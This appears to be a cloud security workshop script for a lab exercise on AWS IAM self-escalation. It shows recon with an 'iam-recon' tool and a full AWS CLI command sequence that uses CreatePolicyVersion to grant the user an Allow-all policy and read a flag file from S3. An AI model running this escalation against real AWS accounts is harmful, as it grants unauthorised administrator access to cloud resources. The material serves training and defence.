# Scenario 1 — Attack bullets (morning, ~15 min)

Source: Lab 1 Exercise 3. Identity: `iamws-policy-developer-user`. Target: crown jewels in `s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt` via self-modifying the policy attached to the user.

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-policy-developer-user` → primary recon for this scenario. Maps to pathfinding.cloud `[iam-001]` (Self-Escalation via CreatePolicyVersion).
- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-policy-developer-user --action iam:CreatePolicyVersion` → confirms the dangerous permission with a clean ALLOW line.
- ⚠️ Note: `argquery --preset privesc` will **not** flag this — iam-recon has no `CreatePolicyVersion` edge checker in `src/edges/iam.rs`. Pathfinding is the right tool here. This is itself a teaching moment (edges vs path mapping).
- `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` → click the user node; pathfinding annotations show alongside the graph.

## Exploit — full command path

```bash
# Step 1: confirm identity
aws sts get-caller-identity --profile iamws-policy-developer-user

# Step 2: try the crown jewels → DENIED
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
# expect: AccessDenied

# Step 3: inspect the policy attached to this user
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"
aws iam get-policy-version \
  --policy-arn $POLICY_ARN --version-id v1 \
  --query 'PolicyVersion.Document' --output json \
  --profile iamws-policy-developer-user
# note: EC2 read-only — limited

# Step 4: create a new admin version and set as default
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile iamws-policy-developer-user

# Step 5: claim the crown jewels
# NOTE: IAM is eventually consistent — the new policy version can take 5–15s to propagate.
#       If Step 5 returns 403, sleep ~15s and retry.
sleep 15
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

## Demo bullets

- Re-run `iam-recon graph create --profile iamws-policy-developer-user` after the exploit.
- Show the node turning red (now admin-equivalent) in the interactive viz.
- Surface the pathfinding.cloud link directly from iam-recon's output.
